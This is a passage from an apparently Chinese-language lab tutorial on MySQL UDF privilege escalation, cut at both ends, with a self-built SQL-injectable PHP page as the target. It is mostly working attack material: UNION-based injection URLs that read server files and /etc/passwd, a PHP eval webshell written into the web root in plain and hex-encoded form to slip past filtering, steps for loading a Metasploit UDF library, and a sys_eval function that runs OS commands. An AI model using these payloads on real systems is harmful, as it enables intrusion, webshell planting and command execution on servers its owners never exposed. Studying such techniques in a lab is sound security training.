+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 查看系统类型</span><br><span class="line">MySQL [pwn]&gt; show variables like &quot;%compile%&quot;;</span><br><span class="line">+-------------------------+------------------+</span><br><span class="line">| Variable_name           | Value            |</span><br><span class="line">+-------------------------+------------------+</span><br><span class="line">| version_compile_machine | i486             |</span><br><span class="line">| version_compile_os      | debian-linux-gnu |</span><br><span class="line">+-------------------------+------------------+</span><br></pre></td></tr></table></figure>
+<ol>
+<li>将自定义函数的库文件放到 MySQL 指定的文件目录下，这个文件目录和 MySQL 的版本相关。</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># MySQL 版本 &lt; 5.0.67, 放在能别系统的链接器检索的文件夹即可，通常系统目录都是行的，如在 Windows中，C:\\WINDOWS\\ 或者 C:\\WINDOWS\\system32\\</span><br><span class="line"># MySQL 版本 &gt;&#x3D; 5.0.67, 指定在 plugin_dir 目录下</span><br><span class="line">mysql&gt; select @@plugin_dir;</span><br><span class="line">+------------------------+</span><br><span class="line">| @@plugin_dir           |</span><br><span class="line">+------------------------+</span><br><span class="line">| &#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F; |</span><br><span class="line">+------------------------+</span><br><span class="line"># 将 UDF 库文件写到 plugin_dir 目录中,前提是可以写文件到 plugin_dir 目录中</span><br><span class="line"># 将 库文件转换成 16进制字符存储，而后写入到表中，最终存到 plugin_dir 目录中，</span><br><span class="line"># Kali Linux 上的 MySQL</span><br><span class="line">MariaDB [(none)]&gt; select hex(load_file(&#39;&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql&#x2F;lib_mysqludf_sys_32.so&#39;)) into dumpfile &#39;&#x2F;tmp&#x2F;udf.hex&#39;;</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line"># 远程登陆的 MySQL，从 Kali Linux上传，使用 local 关键字</span><br><span class="line">MySQL [pwn]&gt; load data local infile &#39;&#x2F;tmp&#x2F;udf.hex&#39; into table udf(data);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">Records: 1  Deleted: 0  Skipped: 0  Warnings: 0</span><br><span class="line"># 将自定义库存到指定目录</span><br><span class="line">MySQL [pwn]&gt; select unhex(data) from udf into dumpfile &#39;&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;udf.so&#39;;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br></pre></td></tr></table></figure>
+<ol>
+<li>在 MySQL 命令行中加载自定义函数</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 创建自定义函数</span><br><span class="line">MySQL [pwn]&gt; create function sys_eval returns string soname &#39;udf.so&#39;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"># 使用</span><br><span class="line">MySQL [pwn]&gt; select sys_eval(&#39;ls &#x2F;&#39;);</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| sys_eval(&#39;ls &#x2F;&#39;)                                                                                                                                           |</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| bin</span><br><span class="line">boot</span><br><span class="line">cdrom</span><br><span class="line">dev</span><br><span class="line">etc</span><br></pre></td></tr></table></figure>
+<ol>
+<li>从 MySQL 中删除自定义函数</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 删除函数</span><br><span class="line">MySQL [pwn]&gt; drop function sys_eval;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure>
+<h2 id="3-UDF实战">3 UDF实战</h2>
+<p>以下为自己构造的场景，然后附上了自我入侵的全过程，如有便捷之处还望指正~</p>
+<h3 id="3-1-大体思路">3.1.大体思路</h3>
+<ol>
+<li>写一句话木马</li>
+<li>菜刀连接</li>
+<li>上传udf文件，不行就先上传大马，然后通过大马上传udf文件</li>
+<li>创建功能函数</li>
+<li>执行提权或者其他命令</li>
+<li>删除函数</li>
+</ol>
+<h3 id="3-2-构造注入页面">3.2.构造注入页面</h3>
+<p>写一个存在SQLi的页面：<code>index.php</code></p>
+<blockquote>
+<p>测试环境：<code>phpstudy ==&gt; PHP7 + MySQL5.7 + Nginx1.15.11</code></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    &#x2F;&#x2F; 自己构造的一个sqli页面</span><br><span class="line">    $pms&#x3D;$_GET[&quot;id&quot;];</span><br><span class="line">    if(empty($pms))&#123;</span><br><span class="line">        $pms&#x3D;1;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;id&#x3D;&quot; . $pms . &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    $conn&#x3D;new mysqli(&quot;localhost&quot;, &quot;root&quot;, &quot;xxxx&quot;, &quot;workdb&quot;);</span><br><span class="line">    if ($conn-&gt;connect_error) &#123;</span><br><span class="line">        die(&quot;连接失败：&quot; . $conn-&gt;connect_error);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 防止中文乱码</span><br><span class="line">    $conn-&gt;query(&quot;set names utf8;&quot;);</span><br><span class="line">    $sql &#x3D; &quot;select username,password from workdb.users where id&#x3D;&quot; . $pms;</span><br><span class="line">    echo &quot;SQL：&quot; . $sql . &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    $result &#x3D; $conn-&gt;query($sql);</span><br><span class="line">    if($result-&gt;num_rows &gt; 0)&#123;</span><br><span class="line">        while($row &#x3D; $result-&gt;fetch_assoc())&#123;</span><br><span class="line">            echo &quot;username：&quot; . $row[&quot;username&quot;] . &quot;，name：&quot; . $row[&quot;password&quot;] . &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;no results&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $conn-&gt;close();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>本案成功前提：配置文件中设置了<code>secure-file-priv=</code>、<code>root允许远程登录</code></p>
+<blockquote>
+<p>PS：如有更好方法，还望大牛指教</p>
+</blockquote>
+<h3 id="3-3-信息查询">3.3.信息查询</h3>
+<p>url构造：<code>index.php?id=1 union select @@version,@@plugin_dir</code></p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1127869-20190825105811381-1629305820-1567178504754.png" alt="base"></p>
+<p>url构造查询：<code>index.php?id=1 union select load_file('D:\\Program Files (x86)\\phpstudy_pro\\WWW\\index.php'),concat(@@version_compile_os,'，',@@version_compile_machine)</code></p>
+<blockquote>
+<p>PS：如果遇到特殊字符屏蔽可以使用16进制（上面场景中我已经说过）</p>
+</blockquote>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1127869-20190825142339272-1107383791-1567178504701.png" alt="web"></p>
+<h5 id="Linux">Linux</h5>
+<p>PS：Linux下可以查看<code>/etc/passwd</code><br>
+<img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1127869-20190824225746546-714590464-1567178504671.png" alt="url"></p>
+<p>发现有Nginx、Apache这些用户名，说明可能存在这些服务器，那么可以试试这些的web默认路径</p>
+<blockquote>
+<p>eg：<code>index.php?id=1 union select load_file('/usr/share/nginx/html/index.php'),2</code></p>
+</blockquote>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1127869-20190824230241254-549292566-1567178504955.png" alt="php"></p>
+<p>so ==&gt; 网站根目录出现了（有时候<code>/etc/passwd</code>中直接就可以看到）</p>
+<h3 id="3-4-写入一句话">3.4.写入一句话</h3>
+<p>url构造：<code>index.php?id=1 union select 0x3c3f706870206576616c28245f504f53545b627279616e5d293b203f3e,1 into outfile 'D:\\Program Files (x86)\\phpstudy_pro\\WWW\\xiaoma.php'</code></p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1127869-20190825101501876-1788835070-1567178504920.png" alt="shellcode"></p>
+<h5 id="Linux-v2">Linux</h5>
+<p>PS：如果Linux权限配置不到位，也是可以通过这种方式上传的</p>
+<p>构造：<code>index.php?id=1 union select '&lt;?php eval($_POST[bryan]); ?&gt;',1 into outfile '/usr/share/nginx/html/xiaoma.php'</code></p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1127869-20190824232305362-1931390351-1567178504978.png" alt="url_ma"></p>
+<p>发现被屏蔽了，那把一句话转换为16进制字符串</p>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id&#x3D;1 union select 0x3c3f706870206576616c28245f504f53545b627279616e5d293b203f3e,1 into outfile &#39;&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;xiaoma.php&#39;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1127869-20190825003141234-1919359307-1567178505131.png" alt="ko"></p>
+<p>PS：权限配置分明的就没法通过这个方式写入一句话了（就看安装的时候权限分配，以及网站根目录权限设置）</p>
+<p>使用菜刀<strong>连接一句话</strong>木马：</p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1127869-20190825003147212-1017081493-1567178505023.png" alt="conn"></p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1127869-20190825003151843-953258582-1567178505063.png" alt="look"></p>
+<h3 id="3-5-连接一句话">3.5.连接一句话</h3>
+<p>菜刀下载：<a href="https://github.com/raddyfiy/caidao-official-version" target="_blank" rel="noopener">https://github.com/raddyfiy/caidao-official-version</a></p>
+<blockquote>
+<p>取代菜刀：<strong>蚁剑</strong>：<a href="https://github.com/AntSwordProject/AntSword-Loader" target="_blank" rel="noopener">https://github.com/AntSwordProject/AntSword-Loader</a> or <strong>Cknife</strong>：<a href="https://github.com/Chora10/Cknife" target="_blank" rel="noopener">https://github.com/Chora10/Cknife</a></p>
+</blockquote>
+<p>通过菜刀连接一句话木马</p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1127869-20190825121509621-860992902-1567178505069.png" alt="conn"></p>
+<p>如果是PHP5则没有问题，如果是PHP7，会出现：<code>Cannot call assert() with string argument dynamically</code>的提示</p>
+<blockquote>
+<p>解决：可以参考我写的这篇文章：<a href="https://www.cnblogs.com/dotnetcrazy/p/11407505.html" target="_blank" rel="noopener">https://www.cnblogs.com/dotnetcrazy/p/11407505.html</a></p>
+</blockquote>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1127869-20190825121937738-1056169889-1567178505100.png" alt="ok"></p>
+<h3 id="3-6-上传文件">3.6.上传文件</h3>
+<p>根据系统去<code>metasploit</code>目录中下载对应的<code>udf文件</code></p>
+<blockquote>
+<p>PS：<a href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql</a></p>
+</blockquote>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1127869-20190825110333919-2070946999-1567178505113.png" alt="dll"></p>
+<p>通过菜刀上传到插件目录：<code>D:\Program Files (x86)\phpstudy_pro\Extensions\MySQL5.7.26\lib\plugin\</code></p>
+<blockquote>
+<p>PS：这边能直接上传，也就免去先上传大马再通过大马上传了</p>
+</blockquote>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1127869-20190825121253388-1009337320-1567178505109.png" alt="upload"></p>
+<p>PS：<strong>Win使用dll，Linux使用so</strong></p>
+<h3 id="3-7-创建功能函数">3.7.创建功能函数</h3>
+<p>url构造：<code>index.php?id=1;create function sys_eval returns string soname 'udf.dll';#</code></p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1127869-20190825133806120-431898830-1567178505145.png" alt="create"></p>
+<p>发现执行命令后不成功</p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1127869-20190825133739487-329750854-1567178505149.png" alt="no"></p>
+<p>PS：开启常规日志可以看到请求的SQL</p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1127869-20190825133702473-513647581-1567178505152.png" alt="logs"></p>
+<p>发现被屏蔽了（可能是因为php的query只能执行一条语句的原因）</p>
+<blockquote>
+<p>PS：大家想到什么一条SQL执行完查询和创建函数的可以说下</p>
+</blockquote>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1127869-20190825133948018-894080291-1567178505191.png" alt="nosql"></p>
+<p>换条思路：读取配置文件（PHP连接MySQL的时候可能有些敏感信息）</p>
+<blockquote>
+<p>PS：Net的<code>web.conf</code>也一样</p>
+</blockquote>
+<p>url构造：<code>index.php?id=1 union select load_file('D:\\Program Files (x86)\\phpstudy_pro\\WWW\\index.php'),2</code></p>
+<blockquote>
+<p>PS：其实我们刚开始信息获取的时候就读过一次了，现在又绕过来了。。。</p>
+</blockquote>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1127869-20190825142645567-687006308-1567178505187.png" alt="info"></p>
+<p>连接远程服务器：<code>./mysql -h'192.168.36.144' -uroot -p</code></p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1127869-20190825142856668-215242558-1567178505195.png" alt="create_func"></p>
+<p>PS：win使用：<code>create function sys_eval returns string soname 'udf.dll';</code></p>
+<blockquote>
+<p>Linux使用：<code>create function sys_eval returns string soname 'udf.so';</code></p>
+</blockquote>
+<h3 id="3-8-执行系统命令">3.8.执行系统命令</h3>
+<p>这时候你通过浏览器执行远程命令也是可以的：</p>
+<blockquote>
+<p>PS：url构造：<code>index.php?id=1 union select sys_eval('whoami'),2</code></p>
+</blockquote>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1127869-20190825130511233-38278163-1567178505197.png" alt="exec"></p>
+<p>PS：删除函数：<code>drop function sys_eval;</code></p>
+<h2 id="4-mysql的udf-使用">4 mysql<strong>的</strong>udf 使用</h2>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_041-1567178982005.png" alt="image"></p>
+<p>介绍：</p>
+<p>mysql(user deﬁned function)用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数拓展mysql的功能。</p>
+<p>其添加的新函数都可以在sql语句中调用。</p>
+<p>原理：</p>
+<p>利用了数据库的root高权限，创建系统函数的udf动态函数库，从而就可以利用系统权限进行提权操作。提权：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、查询导出路径</span><br><span class="line">2、上传udf</span><br><span class="line">3、导出udf</span><br><span class="line">4、创建函数</span><br><span class="line">5、执行命令</span><br></pre></td></tr></table></figure>
+<p>详细：</p>
